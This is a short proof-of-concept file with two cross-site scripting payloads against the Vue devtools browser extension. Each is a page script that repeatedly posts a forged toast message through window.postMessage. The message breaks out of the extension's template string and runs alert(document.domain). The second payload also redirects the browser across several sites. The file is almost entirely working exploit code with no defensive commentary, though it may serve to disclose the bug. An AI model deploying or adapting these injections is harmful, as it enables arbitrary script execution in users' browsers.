XSS1
----

    <script>
        setInterval(() => {
            window.postMessage({
                vueDetected: true,
                vueToast: {
                    message: '`,`normal`); function __VUE_DEVTOOLS_TOAST__(){}; alert(document.domain);//'
                }
            }, '*')
        }, 1000)
    </script>

XSS2
----

    <script>
        const urls = ['https://www.google.com/', 'https://github.com', 'https://vuejs.org/']
        var i = 0;
        setInterval(() => {
            window.postMessage({
                vueDetected: true,
                vueToast: {
                    message: '`,`normal`); function __VUE_DEVTOOLS_TOAST__(){}; alert(document.domain); location=`' + urls[i++%3] +'`//'
                }
            }, '*')
        }, 3000)
    </script>